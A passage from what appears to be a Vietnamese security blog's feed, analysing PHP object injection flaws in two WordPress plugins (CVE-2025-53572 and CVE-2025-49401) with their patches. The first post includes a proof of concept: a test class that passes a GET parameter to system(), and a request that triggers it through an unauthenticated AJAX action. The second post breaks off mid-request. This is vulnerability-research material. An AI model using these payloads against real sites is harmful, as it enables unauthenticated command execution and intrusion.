(&lt;code&gt;wp_ajax_nopriv&lt;/code&gt;):&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_emd_get_widg_pagenum&amp;#39;, &amp;#39;emd_get_widg_pagenum&amp;#39;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi gửi request đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với &lt;code&gt;action=emd_get_widg_pagenum&lt;/code&gt;, callback &lt;code&gt;emd_get_widg_pagenum&lt;/code&gt; sẽ được thực thi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function emd_get_widg_pagenum(){&#xA;&#x9;$response = false;&#xA;&#x9;$pageno = isset($_GET[&amp;#39;pageno&amp;#39;]) ? (int) $_GET[&amp;#39;pageno&amp;#39;] : 1;&#xA;&#x9;$div_id = isset($_GET[&amp;#39;div_id&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;div_id&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;$myapp = isset($_GET[&amp;#39;app&amp;#39;]) ? sanitize_text_field($_GET[&amp;#39;app&amp;#39;]) : &amp;#39;&amp;#39;;&#xA;&#x9;if(!empty($div_id)){&#xA;&#x9;&#x9;$pids = Array();&#xA;        $front_ents = emd_find_limitby(&amp;#39;frontend&amp;#39;, $myapp);&#xA;&#x9;&#x9;$widg_arr = explode(&amp;#34;-&amp;#34;,$div_id);&#xA;&#x9;&#x9;$mywidg = new $widg_arr[1]();&#xA;&#x9;&#x9;...&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Để đoạn &lt;code&gt;new $widg_arr[1]()&lt;/code&gt; được gọi, cần vượt qua điều kiện &lt;code&gt;if(!empty($div_id))&lt;/code&gt;, tức phải truyền giá trị cho tham số &lt;code&gt;div_id&lt;/code&gt; trong GET request.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$widg_arr[1]&lt;/code&gt; là phần tử được lấy từ mảng sau khi &lt;code&gt;explode&lt;/code&gt; giá trị &lt;code&gt;$_GET[&#39;div_id&#39;]&lt;/code&gt;. Ví dụ, nếu &lt;code&gt;div_id=abc-Class&lt;/code&gt; thì &lt;code&gt;$widg_arr[1]&lt;/code&gt; sẽ là &lt;code&gt;Class&lt;/code&gt;, cho phép khởi tạo đối tượng tùy ý thông qua &lt;code&gt;new $widg_arr[1]()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-Class&amp;#34;] &#xA;    --&amp;gt; B[&amp;#34;WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Callback: emd_get_widg_pagenum()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;Check if div_id is not empty&amp;#34;}&#xA;D -- True --&amp;gt; E[&amp;#34;explode(&amp;#39;-&amp;#39;, div_id) → $widg_arr&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Instantiate object: new $widg_arr[1]()&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;&#xA;  public function __construct(){&#xA;    $this-&amp;gt;command = $_GET[&amp;#39;cmd&amp;#39;];&#xA;  }&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Gửi lại request với payload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum&amp;amp;div_id=abc-ObjectInjection&amp;amp;cmd=ls&amp;#43;/ HTTP/1.1&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-18-cve-2025-53572/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-18-cve-2025-53572/result.png&#39; alt=&#34;Result&#34; height=&#34;787&#34; width=&#34;1477&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Lỗ hổng trong &lt;strong&gt;WP Easy Contact &amp;lt;= 4.0.1&lt;/strong&gt; xuất phát từ việc xử lý input không an toàn, cho phép khởi tạo đối tượng trực tiếp từ dữ liệu người dùng. Bằng cách lợi dụng tham số &lt;code&gt;div_id&lt;/code&gt;, attacker có thể thực hiện &lt;strong&gt;PHP Object Injection&lt;/strong&gt; và dẫn đến thực thi mã tùy ý. Bản vá ở &lt;strong&gt;4.0.2&lt;/strong&gt; đã khắc phục bằng cách bổ sung cơ chế whitelist và sanitize input, chỉ cho phép khởi tạo các class hợp lệ. Đây là minh chứng rõ ràng cho việc deserialization không an toàn có thể trở thành điểm khai thác nghiêm trọng khi kết hợp với quyền truy cập không xác thực.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bề mặt tấn công không xác thực&lt;/strong&gt;: Lỗ hổng được kích hoạt qua &lt;code&gt;wp_ajax_nopriv&lt;/code&gt;, không cần đăng nhập.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguyên nhân gốc rễ&lt;/strong&gt;: Sử dụng trực tiếp input người dùng (&lt;code&gt;new $widg_arr[1]()&lt;/code&gt;), không có kiểm tra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Chiến lược vá lỗi&lt;/strong&gt;: Áp dụng &lt;strong&gt;whitelist&lt;/strong&gt; và &lt;strong&gt;sanitize&lt;/strong&gt; để giới hạn class hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Best practice&lt;/strong&gt;: Luôn kiểm tra và làm sạch dữ liệu đầu vào, tránh deserialization không an toàn, hạn chế khởi tạo đối tượng từ nguồn không tin cậy.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-49401 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-17-cve-2025-49401/</link>
      <pubDate>Mon, 17 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-17-cve-2025-49401/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin này thực hiện thao tác &lt;strong&gt;unserialize&lt;/strong&gt; dữ liệu mà người dùng gửi qua trường form, điều này có thể cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; thực hiện &lt;strong&gt;PHP Object Injection&lt;/strong&gt; nếu tồn tại một &lt;em&gt;gadget&lt;/em&gt; phù hợp trong hệ thống.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-49401&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-49401&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 10.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 10.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/quiz-master-next/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Quiz And Survey Master&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.5&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.6&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xuất phát từ việc sử dụng &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Dù đã có biện pháp kiểm tra, cơ chế này vẫn chưa đảm bảo an toàn tuyệt đối.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&#xA;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;    $unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;    if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;        return $unserialized;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã sử dụng &lt;code&gt;unserialize()&lt;/code&gt; thay vì &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Chặn toàn bộ việc tạo object khi unserialize bằng &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt; =&amp;gt; Ngăn chặn PHP Object Injection&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#39; alt=&#34;Diff&#34; height=&#34;772&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Sau khi xem qua logic của hàm &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;, tôi nhận thấy các từ khóa như &lt;code&gt;question&lt;/code&gt; và &lt;code&gt;answer&lt;/code&gt; xuất hiện khá nhiều, cho thấy hàm này nhiều khả năng liên quan trực tiếp đến chức năng xử lý câu hỏi và câu trả lời.&lt;/p&gt;&#xA;&lt;p&gt;Thay vì lần theo từng bước trace, tôi sẽ chủ động tìm các chức năng có liên quan đến &lt;code&gt;question&lt;/code&gt; và &lt;code&gt;answer&lt;/code&gt; để sử dụng, đồng thời kết hợp debug tại hàm &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;. Nếu cách này không hiệu quả thì ta sẽ tiếp tục trace chi tiết.&lt;/p&gt;&#xA;&lt;p&gt;Sau một hồi tọc vạch, tôi đã tạo post với question tùy ý&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; title=&#34;Tạo quiz với Block của plugin&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; data-sub-html=&#34;&lt;h2&gt;Quiz Created&lt;/h2&gt;&lt;p&gt;Tạo quiz với Block của plugin&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#39; alt=&#34;Quiz Created&#34; height=&#34;625&#34; width=&#34;978&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tạo quiz với Block của plugin&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy cập post và &lt;strong&gt;submit answer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#34; title=&#34;Debugger ở hàm qsm_questions_answers_shortcode_to_text&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger ở hàm qsm_questions_answers_shortcode_to_text&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;428&#34; width=&#34;1189&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger ở hàm qsm_questions_answers_shortcode_to_text&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến hàm &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Request hiện tại:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: */*&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Length: 2373&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/index.php/2025/11/17/quiz-1/&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: 